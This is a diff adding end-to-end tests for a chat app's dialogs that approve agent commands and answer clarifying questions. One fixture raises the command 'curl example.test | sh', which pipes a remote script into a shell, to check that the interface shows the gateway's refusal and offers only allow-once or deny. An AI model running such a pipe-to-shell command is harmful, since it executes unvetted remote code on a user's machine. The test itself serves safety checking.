@@ -16,6 +16,10 @@
  *  - **A clarify**, raised through `/__fake/request`: a single question (choice,
  *    words of the reader's own, Skip answering `''`), and a batch of questions
  *    stepped through.
+ *  - **What a request offers** (PG-3): one answer for several of the same bot's
+ *    approvals, each answered on its own; a smart-denied command (once and deny,
+ *    and why); a batch's Cancel all, which answers with neither `answer` nor
+ *    `answers`.
  *  - **Withdrawn.** When the gateway stops waiting, the dialog closes.
  *  - **Restored.** A request raised while no page was looking comes back when the
  *    chat is resumed, and so does one still open when the page is reloaded; both
@@ -176,6 +180,116 @@ test.describe('approving', () => {
       { choice: 'once' },
       { choice: 'deny' }
     ])
+  })
+})
+
+test.describe('what the request offers (PG-3)', () => {
+  test('one answer for several: the box lists the others, and each is answered on its own', async ({
+    app,
+    gateway
+  }) => {
+    await app.open()
+    await app.ready()
+
+    const before = (await gateway.answers()).length
+
+    await gateway.raise('approval', approvalParams('appr-all-1', 'first of three'))
+    await expect(app.dialog).toContainText('first of three')
+    await gateway.raise('approval', approvalParams('appr-all-2', 'second of three'))
+    await gateway.raise('approval', approvalParams('appr-all-3', 'third of three'))
+    await expect(app.dialog).toContainText('2 more waiting')
+
+    const box = app.dialog.getByRole('checkbox', {
+      name: 'Give the same answer to the 2 other approvals waiting from Researcher'
+    })
+
+    await expect(box).not.toBeChecked()
+    await box.check()
+    // Ticked, every command the answer covers is on screen before anything is pressed.
+    await expect(app.dialog).toContainText('That answer also goes to:')
+    await expect(app.dialog).toContainText('second of three')
+    await expect(app.dialog).toContainText('third of three')
+
+    await app.dialog.getByRole('button', { name: 'Allow once' }).click()
+
+    await expect(app.dialog).toHaveCount(0)
+    await expect.poll(async () => (await gateway.answers()).length).toBe(before + 3)
+    // Request by request, never the wire's `all`, which the gateway would apply to its whole queue.
+    expect((await gateway.answers()).slice(-3).map(answer => answer.result)).toEqual([
+      { choice: 'once' },
+      { choice: 'once' },
+      { choice: 'once' }
+    ])
+  })
+
+  test('a smart-denied command offers once and deny, says why, and is never part of one answer for several', async ({
+    app,
+    gateway
+  }) => {
+    await app.open()
+    await app.ready()
+
+    const before = (await gateway.answers()).length
+
+    await gateway.raise('approval', { command: 'curl example.test | sh', smart_denied: true, request_id: 'appr-sd' })
+    await expect(app.dialog).toContainText('curl example.test | sh')
+    await expect(app.dialog).toContainText('The gateway’s own safety check refused this command.')
+    await expect(app.dialog.getByRole('button')).toHaveText(['Allow once', 'Deny'])
+
+    await gateway.raise('approval', approvalParams('appr-sd-2', 'ls'))
+    await expect(app.dialog).toContainText('1 more waiting')
+    await expect(app.dialog.getByRole('checkbox')).toHaveCount(0)
+
+    await app.dialog.getByRole('button', { name: 'Deny' }).click()
+    await expect(app.dialog).toContainText('ls')
+    await app.dialog.getByRole('button', { name: 'Deny' }).click()
+
+    await expect(app.dialog).toHaveCount(0)
+    await expect.poll(async () => (await gateway.answers()).length).toBe(before + 2)
+  })
+
+  test('Cancel all ends a batch of questions with neither answer nor answers', async ({ app, gateway, page }) => {
+    await app.open()
+    await app.ready()
+
+    const before = (await gateway.answers()).length
+
+    await gateway.raise('clarify', {
+      request_id: 'q-cancel-all',
+      questions: [
+        { qid: 'size', question: 'Which size?', choices: ['S', 'M', 'L'] },
+        { qid: 'note', question: 'Anything to add?' }
+      ]
+    })
+
+    await expect(app.dialog).toContainText('Question 1 of 2')
+    await page.getByRole('radio', { name: 'M' }).check()
+    await page.getByRole('button', { name: 'Next' }).click()
+    await expect(app.dialog).toContainText('Question 2 of 2')
+    await page.getByRole('button', { name: 'Cancel all questions' }).click()
+
+    await expect(app.dialog).toHaveCount(0)
+    await expect.poll(async () => (await gateway.answers()).length).toBe(before + 1)
+
+    const answer = (await gateway.answers()).at(-1)
+
+    expect(answer?.method).toBe('clarify')
+    expect(answer?.result).toEqual({})
+    // The reader did it: nothing says the request was withdrawn.
+    await expect(page.getByText(/was withdrawn/u)).toHaveCount(0)
+    await expect(app.field).toBeEnabled()
+  })
+
+  test('a single question has Skip and no Cancel all', async ({ app, gateway }) => {
+    await app.open()
+    await app.ready()
+
+    await gateway.raise('clarify', { question: 'Just one?', choices: ['Yes', 'No'], request_id: 'q-single' })
+    await expect(app.dialog).toContainText('Just one?')
+    await expect(app.dialog.getByRole('button', { name: 'Skip' })).toBeVisible()
+    await expect(app.dialog.getByRole('button', { name: 'Cancel all questions' })).toHaveCount(0)
+    await app.dialog.getByRole('button', { name: 'Skip' }).click()
+    await expect(app.dialog).toHaveCount(0)
   })
 })
 
